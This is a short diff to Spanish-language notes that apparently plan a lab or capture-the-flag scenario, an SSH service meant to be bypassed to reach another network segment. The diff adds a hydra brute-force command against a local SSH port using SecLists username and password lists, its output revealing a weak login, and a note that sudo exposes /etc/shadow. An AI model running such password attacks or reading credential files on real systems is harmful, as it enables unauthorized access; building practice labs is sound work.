@@ -1,6 +1,8 @@
 Montar SSH que solo haga prompt de algo, pero que se pueda bypasear, y saltar a otro segmento de red.
 
-ssh admin:monkey@localhost con sudo
+junquera@vangelis:~$ hydra -L PARA/resources/SecLists/Usernames/top-usernames-shortlist.txt -P PARA/resources/SecLists/Passwords/500-worst-passwords.txt ssh://localhost:2222
+[2222][ssh] host: localhost   login: test   password: monkey
+
 
 sudo da acceso a /etc/shadow
 
